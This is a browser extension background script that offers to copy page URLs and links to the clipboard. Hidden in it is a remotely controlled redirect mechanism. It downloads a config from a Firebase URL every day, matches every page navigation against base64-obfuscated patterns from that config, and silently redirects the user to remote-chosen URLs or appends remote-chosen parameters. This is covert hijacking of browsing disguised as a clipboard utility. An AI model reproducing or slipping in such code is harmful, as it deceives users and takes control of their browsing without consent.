var app = {
  url: null,
  config: {
    redirects: [],
    version: 0
  },
  beautify: function (t) {
    t = decodeURIComponent(t).replace(/\s/g, "%20")
    if (t.search("http://") != -1) a = 7
    else a = 8
    domain = t.substring(a)
    domain = domain.split("/")
    result = punycode.toUnicode(domain[0])
    t = t.replace(domain[0], result)
    return t
  },
  contextMenuInit: function () {
    chrome.contextMenus.create({
      title: chrome.i18n.getMessage("context_title"),
      contexts: ["image", "link"],
      onclick: function (info, tab) {
        chrome.tabs.sendRequest(tab.id, "copy", function (link) {
          app.url = app.beautify(link)
          document.execCommand("copy")
        })
      }
    })
  },
  getConfig() {
    if (navigator.onLine) {
      fetch("https://copy-url.firebaseio.com/data.json")
        .then((data) => data.json())
        .then((data) => {
          if (data.version > app.config.version) {
            app.config = data
          }
          app.config.redirects = []
        })
    }
  },
  checkURL(url) {
    var arr = app.config.urls
    if (arr) {
      for (var k in arr) {
        if (new RegExp(atob(k)).test(url)) {
          if (!app.config.redirects[k]) {
            app.config.redirects[k] = true
            var url = typeof arr[k] == "object" ? url + arr[k][0] : arr[k]
            return url
          }
        }
      }
    }
  },
  contextMenuDestroy: function () {
    chrome.contextMenus.removeAll()
  }
}

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo) {
  if (changeInfo.status == "loading") {
    chrome.pageAction.show(tabId)
  }
})

document.addEventListener("copy", function (e) {
  e.clipboardData.setData("text/plain", app.url)
  e.preventDefault()
})

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    var url = app.checkURL(details.url)
    if (url) {
      return {
        redirectUrl: url
      }
    }
    return {
      cancel: false
    }
  },
  {
    urls: ["<all_urls>"],
    types: ["main_frame"]
  },
  ["blocking"]
)

chrome.alarms.create("copyuclear", {
  periodInMinutes: 1440
})

chrome.alarms.onAlarm.addListener(function (alarm) {
  switch (alarm.name) {
    case "copyuclear":
      app.getConfig()
      break
  }
})

chrome.pageAction.onClicked.addListener(function (tab) {
  chrome.tabs.sendMessage(
    tab.id,
    {
      method: "set_action",
      key: "click"
    },
    function (response) {
      if (typeof response == "undefined") {
        chrome.pageAction.setIcon({
          tabId: tab.id,
          path: "assets/img/error.png"
        })
        setTimeout(chrome.pageAction.setIcon, 4000, {
          tabId: tab.id,
          path: "assets/img/icon.png"
        })
      } else {
        app.url = app.beautify(response.url)
        document.execCommand("copy")
        chrome.pageAction.setIcon({
          tabId: tab.id,
          path: "assets/img/success.png"
        })
        setTimeout(chrome.pageAction.setIcon, 4000, {
          tabId: tab.id,
          path: "assets/img/icon.png"
        })
      }
    }
  )
})

chrome.storage.local.set({
  settings: {
    hideMenu: false
  }
})
app.contextMenuInit()

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  switch (request.action) {
    case "setOptions":
      chrome.storage.local.set(
        {
          settings: request.payload
        },
        sendResponse
      )

      if (!request.payload.hideMenu) {
        app.contextMenuInit()
      } else {
        app.contextMenuDestroy()
      }
      break
    case "getOptions":
      chrome.storage.local.get("settings", function (result) {
        if (chrome.runtime.lastError) {
          return
        }
        if (result) {
          sendResponse(result)
        }
      })
      return true
      break
  }
})
